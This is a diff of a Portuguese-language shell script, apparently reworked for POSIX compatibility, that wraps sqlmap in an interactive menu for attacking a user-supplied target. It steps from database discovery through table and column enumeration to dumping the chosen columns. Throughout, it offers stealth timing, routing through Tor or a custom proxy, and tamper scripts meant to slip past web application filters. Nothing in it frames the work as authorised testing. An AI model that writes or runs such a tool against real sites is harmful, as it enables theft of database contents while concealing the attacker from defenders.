@@ -1,44 +1,38 @@
-#!/bin/bash
-#autor: SaySeven
-if [ $USER != "root" ];then
-    echo "Você Precisa ser root !! "
-    exit
+#!/bin/sh
+# Author: SaySeven
+# Little hacks and compatibility improvments by Luiz Antonio Rangel (a.k.a luiztheblues)
+
+alias install_sqlmap='apt-get install -yv sqlmap'
+alias install_tor='apt-get install -yv tor'
+check_sqlmap="`dpkg --get-selections | grep -c sqlmap`"
+check_tor="`dpkg --get-selections | grep -c tor`"
+
+if [ `whoami` != 'root' ];then
+    printf '%s\n' 'Para rodar esse script, é necessário ser root.'
+    exit 1
 fi
 
-sqlmap=$(dpkg --get-selections | grep -c sqlmap)
-if [ "$sqlmap" -eq "0" ]; then
-        read -p "Sqlmap não instalado!, desaja instalar [yes/no]?: " yeah
-    case $yeah in
-        yes)
-            apt install sqlmap;;
-        y)
-            apt install sqlmap;;
-        no)
-            echo "Sem o Sqlmap, eu não funciono";;
-        n)
-            echo "Sem o Sqlmap, eu não funciono";;
-        *)
-           echo "opção invalida"; exit
-    esac
+if [ "${check_sqlmap}" -eq '0' ]; then
+    printf '%s' 'SQLmap não está instalado; desaja instalar [y/n]? ' 
+    read yeah
+    if printf '%s' "${yeah}" | grep -iq '^y'; then
+      install_sqlmap
+    else
+      printf '%s\n' 'Sem o Sqlmap, não tenho como funcionar.'
+    fi
 fi
+unset yeah # We don't need it in the memory anymore.
 
-tor=$(dpkg --get-selections | grep -c tor)
-if [ "$tor" -eq "0" ]; then
-    read -p "Tor não instalado!, deseja instalar [yes/no]?: " yeah2
-    case $yeah2 in
-        yes)
-            apt install tor;;
-        y)
-            apt install tor;;
-        no)
-            echo "Pulando...";;
-        n)
-            echo "Pulando...";;
-        *)
-            echo "opção invalida"; exit
-    esac
+if [ "${check_tor}" -eq '0' ]; then
+    printf '%s' '[OPCIONAL] Tor não está instalado; deseja instalar [y/n]? '
+    read yeah
+    if printf '%s' "${yeah}" | grep -iq '^y'; then
+      install_tor
+    else
+      printf '%s\n' '"Pulando" dependência opicional.'
+    fi
 fi 
-
+unset yeah
 
 
 cat <<!
@@ -54,119 +48,93 @@ cat <<!
 
 
 !
-read -p "Digite a url ou ip do alvo: " alvo
-echo ""
-echo " 1) Sqlmap padrão "
-echo " 2) Sqlmap furtivo "
-echo " 3) Sqlmap com Tor "
-echo " 4) Sqlmap com proxy personalizado "
-echo " 5) Sqlmap bypass + furtivo + tor"
+printf '%s' 'Digite a URL ou o IP do alvo: '
+read alvo
+printf '%s' "\
+1) SQLmap padrão
+2) SQLmap furtivo
+3) SQLmap com Tor
+4) SQLmap com proxy
+5) SQLmap bypass + furtivo + Tor\n"
 
-read -p "Escolha uma alternativa: " op
-sleep 2
+printf '%s' 'Escolha uma alternativa [1/2/3/4/5]: ' 
+read op
 
-case $op in #Achar bancos
-	1) 
-        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --dbs --no-cast --answers=ANSWERS;;
-	2) 
-        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --time-sec 10 --dbs --no-cast --answers=ANSWERS;;
-	3) 
-        service tor start; sleep 3; sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor --time-sec 10 --dbs --no-cast --answers=ANSWERS;;
-	4) 
-        read -p "Insira ip do http proxy: " proxy;read -p "insira a porta do proxy: " port; sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --proxy="http://$proxy:$port" --time-sec 7 --dbs --no-cast --answers=ANSWERS;;
-    5)  
-        service tor start; sleep 3; sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --tamper="space2comment,charencode" --time-sec 10 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor --dbs --no-cast --answers=ANSWERS;;
-    *)
-        echo "Opção Invalida do sqlmap";exit 
+case "${op}" in
+	1) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --dbs --no-cast --answers=ANSWERS;;
+	2) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --time-sec 10 --dbs --no-cast --answers=ANSWERS;;
+	3) service tor start && sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor --time-sec 10 --dbs --no-cast --answers=ANSWERS;;
+	4) printf '%s' 'Insira IP do proxy HTTP: '; read proxy; printf '%s' "Insira a porta do proxy: "; read port; sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --proxy="http://${proxy}:${port}" --time-sec 7 --dbs --no-cast --answers=ANSWERS;;
+  5) service tor start; sleep 3; sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --tamper='space2comment,charencode' --time-sec 10 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor --dbs --no-cast --answers=ANSWERS;;
+  *) printf '%s\n' 'Opção inválida: não é um inteiro da lista de opções.'; exit 2;; 
+esac
+unset op
+
+printf '%s' 'Digite o banco de dados que você deseja proseguir com o ataque: ' 
+read db
+
+printf '%s' "\
+1) SQLmap padrão
+2) SQLmap furtivo
+3) SQLmap com Tor
+4) SQLmap com proxy
+5) SQLmap bypass + furtivo + Tor\n"
+printf '%s' 'Escolha uma alternativa [1/2/3/4/5]: ' 
+read op
+
+case "${op}" in
+	1) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 -D "${db}" --tables --no-cast --answers=ANSWERS;;
+	2) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --time-sec 10 -D "${db}" --tables --no-cast --answers=ANSWERS;;
+	3) service tor start; sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor --time-sec 10 -D "${db}" --tables --no-cast --answers=ANSWERS;;
+	4) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --proxy="http://${proxy}:${port}" --time-sec 7 -D "${db}" --tables --no-cast --answers=ANSWERS;;
+  5) service tor start; sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --tamper='space2comment,charencode' --time-sec 10 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor -D "${db}" --tables --no-cast --answers=ANSWERS;;
+  *) printf '%s\n' 'Opção inválida: não é um inteiro da lista de opções.'; exit 2;; 
+esac
+unset op
+
+printf '%s' 'Digite a tabela que você deseja proseguir com o ataque: '
+read tb
+
+printf '%s' "\
+1) SQLmap padrão
+2) SQLmap furtivo
+3) SQLmap com Tor
+4) SQLmap com proxy
+5) SQLmap bypass + furtivo + Tor\n"
+printf '%s' 'Escolha uma alternativa [1/2/3/4/5]: ' 
+read op
+
+case "${op}" in
+	1) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 -D "${db}" -T "${tb}" --columns --no-cast --answers=ANSWERS;;
+	2) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --time-sec 10 -D "${db}" -T "${tb}" --columns --no-cast --answers=ANSWERS;;
+	3) service tor start; sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor --time-sec 10 -D "${db}" -T "${tb}" --columns --no-cast --answers=ANSWERS;;
+	4) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --proxy="http://${proxy}:${port}" --time-sec 7 -D "${db}" -T "${tb}" --columns --no-cast --answers=ANSWERS;;
+  5) service tor start; sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --tamper='space2comment,charencode' --time-sec 10 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor -D "${db}" -T "${tb}" --columns --no-cast --answers=ANSWERS;;
+  *) printf '%s\n' 'Opção inválida: não é um inteiro da lista de opções.'; exit 2;; 
+esac
+unset op
+
+printf '%s\n' 'Digite as colunas que você deseja dumpar: '
+read cl
+
+printf '%s' "\
+1) SQLmap padrão
+2) SQLmap furtivo
+3) SQLmap com Tor
+4) SQLmap com proxy
+5) SQLmap bypass + furtivo + Tor\n"
+printf '%s' 'Escolha uma alternativa [1/2/3/4/5]: ' 
+read op
+
+case "${op}" in #Dumpar colunas
+	1) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 -D "${db}" -T "${tb}" -C "${cl}" --dump --no-cast --answers=ANSWERS;;
+	2) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --time-sec 10 -D "${db}" -T "${tb}" -C "${cl}" --dump --no-cast --answers=ANSWERS;;
+	3) service tor start; sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor --time-sec 10 -D "${db}" -T "${tb}" -C "${cl}" --dump --no-cast --answers=ANSWERS;;
+	4) sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --proxy="http://$proxy:$port" --time-sec 7 -D "${db}" -T "${tb}" -C "${cl}" --dump --no-cast --answers=ANSWERS;;
+  5) service tor start; sqlmap -u "${alvo}" --random-agent --risk 3 --level 3 -v 3 --tamper='space2comment,charencode' --time-sec 10 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor -D "${db}" -T "${tb}" -C "${cl}" --dump --no-cast --answers=ANSWERS;;
+  *) printf '%s\n' 'Opção inválida: não é um inteiro da lista de opções.'; exit 2;;
 esac
 
-echo ""
-
-read -p "Digite o banco que você deseja proseguir com o ataque: " db
-sleep 2
-
-echo " 1) Sqlmap padrão "
-echo " 2) Sqlmap furtivo "
-echo " 3) Sqlmap com Tor "
-echo " 4) Sqlmap com proxy personalizado "
-echo " 5) Sqlmap bypass + furtivo + tor"
-
-
-read -p "Escolha uma alternativa: " op
-
-
-case $op in # Olhar tabelas
-	1) 
-        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 -D $db --tables --no-cast --answers=ANSWERS;;
-	2) 
-        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --time-sec 10 -D $db --tables --no-cast --answers=ANSWERS;;
-	3) 
-        service tor start; sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor --time-sec 10 -D $db --tables --no-cast --answers=ANSWERS;;
-	4) 
-        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --proxy="http://$proxy:$port" --time-sec 7 -D $db --tables --no-cast --answers=ANSWERS;;
-    5)
-        service tor start; sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --tamper="space2comment,charencode" --time-sec 10 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor -D $db --tables --no-cast --answers=ANSWERS;;
-    *)
-        echo "Opção Invalida do sqlmap";exit 
-esac
-
-echo ""
-
-read -p "Digite a tabela que você deseja proseguir com o ataque: " tb
-sleep 2
-
-echo " 1) Sqlmap padrão "
-echo " 2) Sqlmap furtivo "
-echo " 3) Sqlmap com Tor "
-echo " 4) Sqlmap com proxy personalizado "
-echo " 5) Sqlmap bypass + furtivo + tor"
-
-
-read -p "Escolha uma alternativa: " op
-
-
-case $op in #Olhar colunas
-	1) 
-        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 -D $db -T $tb --columns --no-cast --answers=ANSWERS;;
-	2) 
-        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --time-sec 10 -D $db -T $tb --columns --no-cast --answers=ANSWERS;;
-	3) 
-        service tor start; sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor --time-sec 10 -D $db -T $tb --columns --no-cast --answers=ANSWERS;;
-	4) 
-        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --proxy="http://$proxy:$port" --time-sec 7 -D $db -T $tb --columns --no-cast --answers=ANSWERS;;
-    5)
-        service tor start; sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --tamper="space2comment,charencode" --time-sec 10 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor -D $db -T $tb --columns --no-cast --answers=ANSWERS;;
-    *)
-        echo "Opção Invalida do sqlmap";exit 
-esac
-
-echo ""
-
-read -p "Digite as colunas que você deseja dumpar: " cl
-sleep 2
-
-echo " 1) Sqlmap padrão "
-echo " 2) Sqlmap furtivo "
-echo " 3) Sqlmap com Tor "
-echo " 4) Sqlmap com proxy personalizado "
-echo " 5) Sqlmap bypass + furtivo + tor"
-
-
-read -p "Escolha uma alternativa: " op
-
-case $op in #Dumpar colunas
-	1) 
-        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 -D $db -T $tb -C $cl --dump --no-cast --answers=ANSWERS;;
-	2) 
-        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --time-sec 10 -D $db -T $tb -C $cl --dump --no-cast --answers=ANSWERS;;
-	3) 
-        service tor start; sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor --time-sec 10 -D $db -T $tb -C $cl --dump --no-cast --answers=ANSWERS;;
-	4) 
-        sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --proxy="http://$proxy:$port" --time-sec 7 -D $db -T $tb -C $cl --dump --no-cast --answers=ANSWERS;;
-    5)
-        service tor start; sqlmap -u $alvo --random-agent --risk 3 --level 3 -v 3 --tamper="space2comment,charencode" --time-sec 10 --tor --tor-port=9050 --tor-type=SOCKS5 --check-tor -D $db -T $tb -C $cl --dump --no-cast --answers=ANSWERS;;
-    *)
-        echo "Opção Invalida do sqlmap";exit 
-esac
-
-service tor stop
+unset op alvo db tb cl # Clean up memory
+service tor stop # Stop Tor service if it stills running
+exit
